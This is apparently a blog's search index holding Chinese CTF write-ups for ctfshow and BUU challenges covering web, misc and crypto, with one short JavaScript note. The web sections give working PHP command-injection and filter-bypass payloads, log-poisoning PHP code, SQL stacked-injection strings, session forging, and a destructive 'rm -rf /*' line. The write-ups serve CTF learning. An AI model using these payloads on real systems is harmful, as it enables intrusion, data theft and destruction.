<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ctfshow菜狗杯</title>
    <link href="/2025/03/01/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
    <url>/2025/03/01/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<p>这篇文章记录ctsshow上菜狗杯的部分题目的wp</p><h1>misc</h1><p>01.杂项签到</p><p>直接把文件放到winhex中，搜索ctfshow直接得到了flag</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0.png"></p><p>02.损坏的压缩包</p><p>附件是一个压缩包，把他放到winhex中进行查看，发现文件头是png</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%851.png"></p><p>更改文件后缀为png，得到一张图片，上面显示flag</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%852.png"></p><p>03.谜之栅栏</p><p>题目提示了找不同，用winhex的比较文件功能</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F1.png"></p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F2.png"></p><p>两个文本拼接起来，得到flag</p><p>ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}</p><p>04.你真的会数数吗</p><p>这里用010的词频统计直方图功能得到flag</p><p>ctfshow{a1b2d3e4g56i7j8k9l0}</p><h1>web</h1><p>01.web2 c0me_t0_s1gn</p><p>首先打开环境，打开F12查看到了半个flag和hint</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web201.png"></p><p>接下来打开控制台，输入给的函数得到了另外一半flag</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web202.png"></p><p>02.我的眼里只有$</p><p>这道题实在是看的我一愣一愣的(被自己菜哭了)</p><p>看大佬们的wp才有了思路，这是一道变量覆盖题，还有两个函数</p><p>extract ()： 从数组中将变量导入到当前的符号表 。</p><p>extract($_POST);： 将post上来的数据直接都解析成变量的形式，在代码中可以直接使用</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web301.png"></p><p>一共有36个$，所以我们要搞出36个变量，并且最后以一个变量用于执行命令（因为外面套的eval函数），具体是把上一个变量赋值给下一个变量，一直到第36个变量赋值为执行的命令。</p><p>题目给出的$_是第一个变量，写一个简单的python脚本来生成payload</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web302.png"></p><p>先用ls命名看一下目录发现了&#x2F;f1agaaa</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web303.png"></p><p>然后输出这个就可以得到flag</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/web304.png"></p><p>03.抽老婆</p><p>首先打开环境，ctrl+u之后看到里面有download?file&#x3D;</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8A%BD%E8%80%81%E5%A9%8601.png"></p><p>我传入了一个1之后到了这个界面</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8A%BD%E8%80%81%E5%A9%8602.png"></p><p>看到其中有一个app.py，返回两层下载一下这个文件进行一下查看</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/w%E6%8A%BD%E8%80%81%E5%A9%8603png"></p><p>可以看到其中有个&#x2F;secret_path_U_never_know路径，但是可以看出还需要绕过身份验证</p><p>这个用的应该是jwt认证，我们将isadmin里面的值更改后，使用密钥secret_key重新加密生成一个seesion，这里使用一个开源的脚本</p><p><a href="https://gitcode.com/gh_mirrors/fl/flask-session-cookie-manager?utm_source=csdn_github_accelerator&isLogin=1">github-flask-session-manager-master</a></p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8A%BD%E8%80%81%E5%A9%8604.png"></p><p>生成之后我们在bp抓包之后用新生成的session替换掉以前的session，这样就可以得到flag了</p><p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8A%BD%E8%80%81%E5%A9%8605.png"></p>]]></content>
    
    
    <categories>
      
      <category>综合</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web_萌新</title>
    <link href="/2025/02/22/ctfshow-web-%E8%90%8C%E6%96%B0/"/>
    <url>/2025/02/22/ctfshow-web-%E8%90%8C%E6%96%B0/</url>
    
    <content type="html"><![CDATA[<p>今天做的是ctfshow中的萌新板块中的web类的题目，用这篇文章记录一下wp</p><p>web01</p><p>打开靶机，查看源码</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1.png"></p><p>分析一下这个代码，首先提示了id要等于1000会出现flag，但是代码中也写到了如果id大于999就会输出id error<br>那么就要考虑一下绕过intval()函数</p><p>查阅了一下网上的资料</p><b>intval函数特性：<br>intval函数是获取变量的整型值，当它获取的变量不能被转换时返回0；<br>如果字符串其中有数字，则返回数字；<br>如果开头无法被转换，则返回0；</b><p>所以有以下几种方式绕过：</p><p>1.单引号绕过: &#x2F;?id&#x3D;’1000’</p><p>2.相乘绕过: &#x2F;?id&#x3D;100*10</p><p>3.十六进制绕过: &#x2F;?id&#x3D;0x3e8</p><p>4.二进制绕过: &#x2F;?id&#x3D;0b1111101000</p><p>5.逻辑或绕过: &#x2F;?id&#x3D;999 or id&#x3D;1000</p><p>6.二次去反绕过: &#x2F;?id&#x3D;~~1000</p><p>等等</p><p>绕过即可得到flag。</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/2.png"></p><p>web02</p><p>相比于上一题加了一些过滤，如or<br>我用的单引号绕过</p><p>web03</p><p>过滤了更多东西，把十六进制绕过给过滤了<br>依旧用单引号绕过</p><p>web04<br>可以看到再次增加过滤的东西</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/3.png"></p><p>可以看到十六进制和乘号被过滤了，其他的没有被过滤</p><p>我们依旧采用单引号进行绕过</p><p>web05</p><p>这次我们看到把单引号和双引号也给过滤了</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/4.png"></p><p>但是没有过滤二进制，那我们这次用二进制绕过</p><p>web06</p><p>继续进行查看发现还是继续增加过滤</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/5.png"></p><p>但是依旧没有过滤二进制，那么我们继续用二进制进行绕过</p><p>web07</p><p>继续进行查看，这次过滤了~.</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/6.png"></p><p>那么二次去反就无法使用了，但是依旧还是没有过滤二进制 (阿呆也是够马虎的)</p><p>web08</p><p>结束了阿呆传奇，我们迎来了这个题</p><p>首先查看源代码</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/7.png"></p><p>要找这个key，我也不知道这个Key是哪来的</p><p>查看了别人的wp发现这是一个梗题</p><p>阿呆的一系列操作就是删库跑路了</p><p>所以是rm -rf &#x2F;*</p><p>这样就得到了flag</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/8.png"></p><p>web09</p><p>我的天，又是你阿呆！</p><p>首先来看代码</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/9.png"></p><p>这是一道命令执行题</p><p>看到有system</p><p>直接&#x2F;?c&#x3D;system(‘cat config.php’);</p><p>得到flag</p><p>web10</p><p>首先观察代码，发现相较于上一题做了过滤</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/10.png"></p><p>有两种方法</p><p>方法一是使用passthru函数</p><p>&#x2F;?c&#x3D;passthru(‘cat config.php’);</p><p>方法二是函数拼接</p><p>&#x2F;?c&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$d&#x3D;$a.$b;$d(‘cat config.php’);</p><p>常见的命令执行函数：<br>system()<br>passthru()<br>exec()<br>shell_exec()<br>popen()<br>proc_open()<br>pcntl_exec()</p><p>这样就可以得到flag</p><p>web11</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/11.png"></p><p>观察代码，这次是将cat给过滤了</p><p>但是还有很多显示文本的命令</p><b>cat命令用于连接文件并打印到标准输出设备上。<p>tac将文件全部内容从尾到头反向连续输出到标准输出(屏幕)上</p><p>more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示 </p><p>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。</p><p>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。</p><p>tail 命令可用于查看文件的内容，有一个常用的参数 -f 常用于查阅正在改变的日志文件。</p><p>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。</p><p>sort 命令用于将文本文件内容加以排序。</p><p>nl命令在linux系统中用来计算文件中行号</p><p>uniq 可检查文本文件中重复出现的行列</p><p>Linux中，&#96;&#96; 作用是优先执行里面的内容，再把里面的内容传给外面的语句<br></p></b><p></p><p>web12</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/12.png"></p><p>这次过滤的更多了，把 php , config , . ,也给过滤了</p><p>那我们把config.php进行base64编码绕过</p><p>?c&#x3D;$a&#x3D;base64_decode(%22c3lzdGVt%22);$b&#x3D;base64_decode(%22Y2F0IGNvbmZpZy5waHA&#x3D;%22);$a($b);</p><p>这样便得到了flag</p><p>web13</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/13.png"></p><p>还是继续增加过滤，这次将 file 和 ; 给过滤了</p><p> ?c&#x3D;passthru(base64_decode(%27Y2F0IGNvbmZpZy5waHA&#x3D;%27))?%3E</p><p>此处涉及到php中反引号的作用：</p><p><b>执行其内的语句并返回值</b></p><p>这样得到flag</p><p>web14</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1401.png"></p><p>这次是增加了括号</p><p> ?c&#x3D;include$_GET[‘a’]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p><p>这样进行绕过</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1402.png"></p><p>得到了一串base64编码的文本</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1403.png"></p><p>解码之后得到flag</p><p>web15</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/15.png"></p><p>这次对等号，问号和星号进行了过滤，反而分号可以用了</p><p>用反引号接收一个参数a,然后a中是所需执行的语句</p><p>?c&#x3D;echo <code>$_GET[a]</code>;&amp;a&#x3D;cat config.php</p><p>这样得到flag</p><p>web16</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1601.png"></p><p>这道题的代码显示，ctfshow加上参数c的md5值等于 a6f57ae38a22448c2f07f3f95f49c84e</p><p>进行md5解密</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1602.png"></p><p>这个结果去掉ctfshow就是我们要传入的参数c了</p><p>得到flag</p><p>web17</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1701.png"></p><p>过滤了php，首先考虑了data伪协议，但是经过尝试之后发现不行</p><p>看了其他大佬的wp之后，知道了是一道日志包含题，抓包之后查看得知服务器为Ubuntu(由nginx搭建的网站，nginx的日志文件默认地址在var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log)</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1702.png"></p><p>那我们创建payload：</p><p><b>&#x2F;?c&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</b></p><p>然后用bp抓包，在UA处增加<?php echo system('ls');?></p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1703.png"></p><p>这样我们得到了36d.php和index.php两个文件名</p><p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1704.png"></p><p>接下来再在UA处<?php highlight_file('36d.php');?></p><p>这样我们就得到了flag</p><p>注意，日志包含类的题目不能出现语法错误，不然就会一直出现相同的报错，必须重开容器了。</p><p>接下来的web18-web21都可以这样解决</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习日志js基础</title>
    <link href="/2025/02/18/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/02/18/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>今天学习了一下js的一些基础知识在这里记录一下</p><p> 1.书写位置</p><p>1.1 内嵌式</p><p>写在html文件里，用&lt; script &gt;标签包住</p><p>下面是一个实例</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/1.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/2.png"></p><p>1.2内联式</p><p>直接将其写到标签内部。</p><p>下面是一个实例</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/3.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/4.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/5.png"></p><p>1.3外部式</p><p>在外部新建一个js文件，然后通过 script 标签引入到html文件当中</p><p>下面是一个实例</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/6.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/7.png"></p><p>2.基础语法</p><p>2.1输入语句为prompt()</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/8.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/9.png"></p><p>2.2输出语句</p><p>输出语句 document.write() 输出给用户</p><p>弹出警示框 alert()</p><p>控制台输出 console.log() 用于程序员调试</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/10.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/11.png"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/12.png"></p><p>3.变量</p><p>3.1变量的定义</p><p>变量可以理解为一个储存数据的容器</p><p>3.2变量的使用</p><p>在现在一般是使用 let 来定义一个变量<br>还有 var 也是经常被用来定义变量的</p><p>let age &#x3D; 18</p><p>var age &#x3D; 18</p>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu-wp（crypto）</title>
    <link href="/2025/02/09/buu-wp%EF%BC%88crypto%EF%BC%89/"/>
    <url>/2025/02/09/buu-wp%EF%BC%88crypto%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>1.RSA</p><p>打开文件，已知p,q,e<br>编写脚本</p><p>得到最后的d,包上flag</p><p>2.一眼就解密</p><p>后面有等号推测是base64编码</p><p>3.MD5<br>打开文件得到</p><p>看题目就可以知道是md5解密，用在线工具解密一下得到flag</p><p>4.Url编码</p><p>根据题目可以知道是url编码，解码得到</p><p>5.看我回旋踢<br>打开文件得到一串看不懂的字符串，推测是凯撒密码</p><p>6.摩丝<br>根据题目可知，摩斯电码</p><p>7.password</p><p>张三—&gt;zs<br>密码为zs19900315<br>8.变异凯撒密码<br>凯撒密码的本质就是移位</p><p>对比acsii码第一个往后移了5位，第二个往后移了6位，那我们就已经得知了规律<br>编写脚本得到flag</p><p>9.Quoted-printable</p><p>看题目可知quoted-printable编码<br>Quoted-Printable编码方法，适合所传输数据中，只有少量的非ASCII编码，用一个等号(&#x3D;)后面加两个数字字符来表示一个非ASCII码字符。<br>复制到在线工具当中进行解码</p><p>得到flag</p><p>10.篱笆墙的影子</p><p>看题目推测是栅栏密码，经过解码得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-wp（杂项）</title>
    <link href="/2025/02/09/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/"/>
    <url>/2025/02/09/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>这一篇文章来记录在Buu中做的misc类的题目的wp</p><h1>大白</h1><p>发现hint是屏幕太小了，推测是不是高度爆破<br>拖入winhex当中进行高度爆破发现得到了flag</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/1.png"></p><h1>LSB</h1><p>用stegsolve打开图片发现当rgb等于0的时候隐藏的东西</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/2.png"></p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/3.png"></p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/4.png"></p><p>所以用data extract进行下一步</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/5.png"></p><p>保存得到了这个二维码，QR Reaserch扫描这个二维码得到最终的flag</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/6.png"></p><h1>你竟然赶我走</h1><p>用010打开文件在文件的末尾发现flag<br>flag{stego_is_s0_bor1ing}</p><h1>乌镇峰会种图</h1><p>用010打开图片发现在文件末端有flag</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/7.png"></p><h1>来首歌吧</h1><p>用Audacity软件打开这段音频</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/8.png"></p><p>发现上面类似于摩斯电码，短的为点，长的为杠</p><p>….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.</p><p>用在线工具转码</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/9.png"></p><p>得到flag</p><h1>藏在文件中的秘密</h1><p>是一张图片，用记事本打开，发现flag</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/10.png"></p><h1>wireshark</h1><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/11.png"></p><p>根据提示直接搜索POST提交的流量，找到了密码</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/12.png"></p><h1>zip伪加密</h1><p>题目名字为zip伪加密，把压缩包放到winhex当中，进行查看</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/13.png"></p><p>更改全局变量为00即可</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/14.png"></p><p>得到flag</p><h1>金三胖</h1>附件中是一个gif文件将他放到stegsolve中用Frame Browser进行分析，一张一张往后翻<p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/15.png"></p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/16.png"></p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/17.png"></p><p>得到flag</p><h1>二维码</h1><p>打开附件，里面有一个二维码</p><p>扫描</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/18.png"></p><p>发现这个不对，那么放进winhex中进行查看</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/19.png"></p><p>发现里面有一个txt文件，将后缀改为zip</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/20.png"></p><p>提示是一个四位数密码，放在ziperrllo中进行破解</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/21.png"></p><p>得到密码7639，得到flag</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/22.png"></p><h1>N种方式解决</h1><p>打开附件，是一个exe文件，发现打不开，那么将他放在winhex中进行查看</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/23.png"></p><p>发现其实是一个jpg文件，加上后面有base64推测是base64转图片</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/24.png"></p><p>得到一个二维码</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/25.png"></p><p>得到flag</p><h1>基础破解</h1><p>附件中有一个加密的txt，</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/26.png"></p><p>提示是四位数加密，放在ARCHPR中进行破解</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/27.png"></p><p>得到密码2563</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/28.png"></p><p>得到一串字符串，一看就是base64编码</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/29.png"></p><p>得到flag</p><h1>假如给我三天光明</h1><p>打开附件</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/30.png"></p><p>下面的是盲文，根据盲文对照表得到密码</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/31.png"></p><p>得到密码kmdonowg<br>是一个音频文件</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/32.png"></p><p>发现是摩斯电码</p><p>-.-.  -  ..-.  .–  .–.  .  ..  —–  —..  –…  …–  ..—  ..–..  ..—  …–  -..  –..</p><p><img src="/images/buu-wp%EF%BC%88%E6%9D%82%E9%A1%B9%EF%BC%89/33.png"></p><p>得到flagflag{wpei08732?23dz}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>训练赛easy_tornado</title>
    <link href="/2025/02/07/%E8%AE%AD%E7%BB%83%E8%B5%9Beasy-tornado/"/>
    <url>/2025/02/07/%E8%AE%AD%E7%BB%83%E8%B5%9Beasy-tornado/</url>
    
    <content type="html"><![CDATA[<p>这是训练赛上面的tornado题目和buu上的easy-tornado是一个题目在此一块进行记录。</p><p>打开靶场，发现有三个目录</p><p><img src="/images/tornado/1.png"></p><p>分别是</p><p><img src="/images/tornado/2.png"></p><p><img src="/images/tornado/3.png"></p><p>得到了这两个提示，分别是filename和filehash<br>现在需要做的就是找到cookie_secret<br>更改了上面的哈希值，发现产生回显，但是我在此处看不懂，查看大佬们写的wp</p><p><img src="/images/tornado/4.png"></p><p>得到cookie_secret</p><p><img src="/images/tornado/5.png"></p><p><img src="/images/tornado/6.png"></p><p><img src="/images/tornado/7.png"></p><p>所以得到了flag</p><p><img src="/images/tornado/8.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu-wp（web）</title>
    <link href="/2025/02/07/buu-wp/"/>
    <url>/2025/02/07/buu-wp/</url>
    
    <content type="html"><![CDATA[<p>今天这个篇章用来记录在buu平台上做的题，记录wp</p><h1>[极客大挑战 2019]EasySQL</h1><p>打开靶机，查看题目</p><p><img src="/images/buu-wp(web)/1.png"></p><p>查看源代码只有一个登录框<br>首先尝试测试是单引号闭合还是双引号闭合<br>先尝试双引号闭合，发现没有报错</p><p><img src="/images/buu-wp(web)/2.png"></p><p>再尝试单引号闭合，发现查询语句报错，说明数据库是单引号闭合</p><p><img src="/images/buu-wp(web)/3.png"></p><p>尝试构建万能语句绕过验证，使用单引号型的万能密码</p><p><img src="/images/buu-wp(web)/4.png"></p><p>最后得到flag</p><p><img src="/images/buu-wp(web)/5.png"></p><h1>[极客大挑战 2019]Havefun</h1><p>首先打开靶机，摁f12查看源代码</p><p><img src="/images/buu-wp(web)/6.png"></p><p>如果cat&#x3D;dog则会输出’syc{cat_cat_cat}’<br>构建&#x2F;？cat&#x3D;dog</p><p><img src="/images/buu-wp(web)/7.png"></p><p>得到flag.</p><h1>[ACTF2020 新生赛]Include</h1><p>先摁f12查看源代码，发现一个flag.php文件</p><p><img src="/images/buu-wp(web)/8.png"></p><p>Include类题目使用php伪协议</p><p><img src="/images/buu-wp(web)/9.png"></p><p>用base64解码<br>Playload<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>得到<br>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7M2U0MmQwYWUtMDU2OC00MmQ1LTllYjktNzkwZTU4ODMxNTIxfQo&#x3D;<br>使用base64进行解码得到flag</p><p><img src="/images/buu-wp(web)/10.png"></p><h1>[GXYCTF2019]Ping Ping Ping</h1>打开靶机<p><img src="/images/buu-wp(web)/11.png"></p><p>让我们提交一个ip，题目是ping，所以我们ping一下本机地址127.0.0.1在用管道符，加上ls命令</p><p><img src="/images/buu-wp(web)/12.png"></p><p><img src="/images/buu-wp(web)/13.png"></p><p>得到两个php文件名，尝试cat flag.php</p><p><img src="/images/buu-wp(web)/14.png"></p><p>发现空格被过滤了，进行空格绕过，以下方式可以绕过空格</p><p><img src="/images/buu-wp(web)/15.png"></p><p>经过尝试发现$IFS$1可以绕过，构造playload<br>&#x2F;?ip&#x3D;127.0.0.1;ca他$IFS$1flag<br>结果发现flag也被过滤了</p><p><img src="/images/buu-wp(web)/16.png"></p><p>那就查看一下index.php</p><p><img src="/images/buu-wp(web)/17.png"></p><p>进行一下代码审计，发现很多符号都过被过滤了，但是发现有一个a变量可以进行替换<br>所以构造playload&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1\fla$a.php</p><p><img src="/images/buu-wp(web)/18.png"></p><p>得到flag</p><h1>[SUCTF 2019]EasySQL</h1><p>打开靶场，首先尝试万能密码，发现不能通过，那么尝试堆叠注入，发现可以进行<br>首先查询数据库</p><p><img src="/images/buu-wp(web)/19.png"></p><p>查询表名</p><p><img src="/images/buu-wp(web)/20.png"></p><p>直接查询flag发现不行</p><p><img src="/images/buu-wp(web)/21.png"></p><p>回显为nonono<br>查看一下大佬们的wp。这里大佬猜测的查询语句为：<br>select $_GET[‘query’] || flag from flag<br>这里的||在mysql中表示或，如果前一个操作数为真，则不看后面的语句，然后构造payload<br>  *,1</p><p><img src="/images/buu-wp(web)/22.png"></p><p>最后得到flag，向大佬学习</p><p><img src="/images/buu-wp(web)/23.png"></p><h1>[强网杯 2019]随便注</h1>判断闭合方式先传入一个1<p><img src="/images/buu-wp(web)/24.png"></p><p>再传入1’</p><p><img src="/images/buu-wp(web)/25.png"></p><p>可以判断是单引号闭合<br>2.判断有没有过滤，输入一个select</p><p><img src="/images/buu-wp(web)/26.png"></p><p>发现select|update|delete|drop|insert|where这些词被过滤了<br>那么首先尝试堆叠注入<br>1’;show databases– q</p><p><img src="/images/buu-wp(web)/27.png"></p><p>再尝试爆表名<br>1’;show tables– q</p><p><img src="/images/buu-wp(web)/28.png"></p><p>发现有两个表，我们依次进行尝试<br>首先尝试1’;show columns from ‘words’– q</p><p><img src="/images/buu-wp(web)/29.png"></p><p>再尝试1’; show columns from <code>1919810931114514</code>– q</p><p><img src="/images/buu-wp(web)/30.png"></p><p>发现了flag</p><p><img src="/images/buu-wp(web)/31.png"></p><h1>[极客大挑战 2019]Secret File</h1><p><img src="/images/buu-wp(web)/32.png"></p><p>打开靶场并没有发现有效的信息，摁f12查看</p><p><img src="/images/buu-wp(web)/33.png"></p><p>发现一个&#x2F;Archibe.rppm.php，点开看看</p><p><img src="/images/buu-wp(web)/34.png"></p><p>点击按钮发现没有信息，抓包一下看看</p><p><img src="/images/buu-wp(web)/35.png"></p><p>发现了一个被诠释的php文件点开看看</p><p><img src="/images/buu-wp(web)/36.png"></p><p>开始代码审计，运用PHP伪协议构造filter伪协议</p><p><img src="/images/buu-wp(web)/37.png"></p><p>看到出现的字符串是以&#x3D;结尾的，推测应该是base64编码</p><p><img 